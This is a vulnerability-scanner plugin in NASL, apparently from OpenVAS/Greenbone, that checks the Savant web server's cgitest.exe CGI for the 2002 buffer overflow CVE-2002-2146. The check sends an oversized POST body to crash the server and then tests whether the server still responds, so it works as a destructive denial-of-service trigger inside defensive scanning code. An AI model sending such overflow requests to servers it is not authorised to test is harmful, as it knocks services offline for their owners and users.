# SPDX-FileCopyrightText: 2002 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11173");
  script_version("2025-04-11T05:40:28+0000");
  script_tag(name:"last_modification", value:"2025-04-11 05:40:28 +0000 (Fri, 11 Apr 2025)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2002-2146");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/5706");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Savant cgitest.exe Buffer Overflow DoS Vulnerability");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("Copyright (C) 2002 Michel Arboi");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade your web server or remove this CGI.");

  script_tag(name:"summary", value:"cgitest.exe from Savant web server is installed. This CGI is
  vulnerable to a buffer overflow which may allow an attacker to crash the server or even run
  code on it.");

  script_tag(name:"affected", value:"Savant version 3.1 is known to be affected. Other versions or
  products might be affected as well.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_404.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port( default:80 );

if( http_is_dead( port:port ) )
  exit( 0 );

foreach dir( make_list_unique( "/", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/cgitest.exe";

  if( http_is_cgi_installed_ka( item:url, port:port ) ) {

    soc = http_open_socket( port );
    if( ! soc ) exit( 0 );

    len = 256; # 136 should be enough
    req = string( "POST ", url, " HTTP/1.0\r\n",
                  "Host: ", get_host_ip(),
                  "\r\nContent-Length: ", len,
                  "\r\n\r\n", crap( len ), "\r\n" );
    send( socket:soc, data:req );
    http_close_socket( soc );

    sleep( 1 );

    if( http_is_dead( port:port ) ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
